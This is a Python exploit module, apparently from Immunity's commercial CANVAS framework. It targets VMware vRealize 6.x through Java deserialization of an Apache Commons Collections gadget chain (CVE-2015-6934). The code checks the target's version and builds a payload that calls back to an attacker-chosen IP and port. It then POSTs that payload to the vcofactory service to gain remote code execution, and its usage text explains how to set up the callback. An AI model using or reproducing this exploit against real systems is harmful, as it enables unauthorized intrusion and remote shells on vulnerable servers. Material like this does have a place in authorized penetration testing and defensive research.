#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import logging
import os
import base64
import struct
import re
import json

from urllib import quote
from time import sleep

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
import urllib
import random
import libs.spkproxy as spkproxy
from libs.apache_commons_deserialize import objectcreator

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

NAME                            = "vrealize_vcofactory_deserialize"
DESCRIPTION                     = "VMWare VRealize 6.x vcofactory Java Object Deserialization Code Execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "VMWare"
DOCUMENTATION['Repeatability']  = "Infinite"
DOCUMENTATION['CVE Name']       = "CVE-2015-6934"
DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6934"
DOCUMENTATION['References']     = ['https://www.vmware.com/security/advisories/VMSA-2015-0009']

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['VERSION']             = ["6.0.1.2490144"]
# PROPERTY['ARCH']                = [["Linux" ]]

DOCUMENTATION['NOTES'] = """
IMPORTANT NOTE: Any instance of this application running Apache Commons Collections version prior to 3.0 WILL NOT WORK. 


VMWare VRealize has a remoting interface named vcofactory. It communicates with a client by exchanging
serialized Java objects.

Apache Commons pre-3.2 allows users to serialize
transformers on collection values. Of importance to us is the InvokerTransfomer, which is capable
of invoking Java methods. We are able to run these transformers by adding them to an
annotation map whose members are acccessed. The right chain of method invocations leads to arbitrary
code execution.

Tested targets:
> vRealize 6.0.1.2490144
- Windows 8.1 Pro x86_64 EN / Java 6u45 - SUCCESS
- Windows 8.1 Pro x86_64 EN / Java 7u80 - SUCCESS
- Windows 8.1 Pro x86_64 EN / Java 8u73 - SUCCESS

> vCenter Orchestrator Appliance
- Appliance's VMDK is corrupted

> vRealize Operations Manager Appliance 6.2.0.3
- Publically accessible interfaces require client certificate authentication. A CA-signed client certificate is necessary to connect.
"""

CHANGELOG = """
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port               = 8281
        self.host               = ""
        self.version            = 0
        self.done               = 0
        self.name               = NAME
        self.basepath           = "/vco/webremoting/vcofactory.service"

        self.mosdef_type = "UNIVERSAL"
        self.http_ssl = False

        # self.command            = None
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.verb               = "POST"
        self.content_type       = ""
        self.version_re         = re.compile("\((?P<version>[^\)]+)\)")


        self.targetpath         = ""


        # MOSDEF options
        self.autoFind = False


        return

    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        if mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def needs_mosdef_http(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        return mosdef_type == "HTTP"

    def needs_mosdef_ssl(self):
        return self.http_ssl

    def getargs(self):
        """
        Get arguments for attack
        """
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.host=self.target.interface
        return

    def send_vco_request(self, payload=None):
        if not self.hostname:
            self.hostname = self.host

        self.log("Attacking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        targetstring = "https://" + self.hostname + ":" + str(self.port) + self.basepath
        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        host_field = "%s:%s" % (self.hostname, self.port)

        self.ua.addHeader("host", host_field)

        data = None
        if payload != None:
            data = self.ua.POST(self.targetpath, payload, extraheaders=None, noresponse=True)
        else:
            data = self.ua.GET(self.targetpath, noresponse=False)

        return data

    def extract_regex_result(self, string, regex, field_name):
        result = regex.search(string)

        if not result:
            return None
        else:
            result_dict = result.groupdict()
            if field_name not in result_dict:
                return None
            else:
                return result_dict[field_name]

    def getsocket(self):
        if ":" in self.host:
            return self.gettcpsock(AF_INET6=1)
        else:
            return self.gettcpsock()


    def test(self):
        self.getargs()

        if not self.hostname:
            self.hostname = self.host

        self.log("Checking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)


        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        targetstring = "https://" + self.hostname + ":" + str(self.port) + "/vco/api/about"
        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        host_field = "%s:%s" % (self.hostname, self.port)

        self.ua.addHeader("host", host_field)

        data = None
        data = self.ua.GET(self.targetpath, noresponse=False)

        self.log("got response:%s from /vco/api/about" % data)

        data = json.loads(data)

        version_string = self.extract_regex_result(data["version"], self.version_re, "version")

        return int(version_string <= "6.0.1.2490144")


    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))

        if self.test():
            self.setProgress(50)


            payload = objectcreator(callback_ip=self.callback.ip,
                                    callback_port=self.callback.port,
                                    use_http=self.needs_mosdef_http(),
                                    use_ssl=self.needs_mosdef_ssl()).get_payload()

            self.send_vco_request(payload)

            self.setProgress(100)

            self.setInfo("%s attacking %s:%d (DONE)" % (self.name, self.host, self.port))


        return 1


    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                 [optional]")
        logging.info("-O basepath: /path/to/vbulletin/ [optional]")
        logging.info("-O hostname: target vhost        [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
